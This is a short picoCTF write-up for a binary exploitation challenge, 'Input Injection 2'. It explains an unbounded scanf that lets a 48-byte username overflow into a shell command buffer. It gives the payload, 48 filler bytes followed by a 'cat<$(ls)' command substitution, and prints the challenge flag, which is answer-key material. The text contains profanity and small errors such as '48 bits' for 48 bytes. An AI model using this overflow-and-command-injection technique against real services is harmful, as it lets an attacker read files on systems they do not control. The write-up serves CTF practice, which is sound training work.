# PicoCTF - Input Injection 2 Writeup

## Category
Binary Exploitation

## Difficulty
Medium

## What's up?

We are given a vulnerable C program running on a remote server.

Connecting to the server shows:

```
username at 0x176c52a0
shell at 0x176c52d0
Enter username: 
```

### What fucked up

`scanf("%s")` did not chekc bounds 
- `shell_addr - username_addr = 0x176c52d0 - 0x176c52a0 = 0x30 = 48 bytes`

### What can we do
Send 48 bytes of prefex to fill the buffer, then overwrite it with our command.

Since `scanf("%s")` stops at spaces, we cannot use `cat flag.txt`. Instead, we use shell command substitution:

- **Payload**: `FUCKFUCK...FUCKcat<$(ls)`
*48 bits of `FUCK`

## Flag

```
picoCTF{us3rn4m3_2_sh3ll_6538c392}
```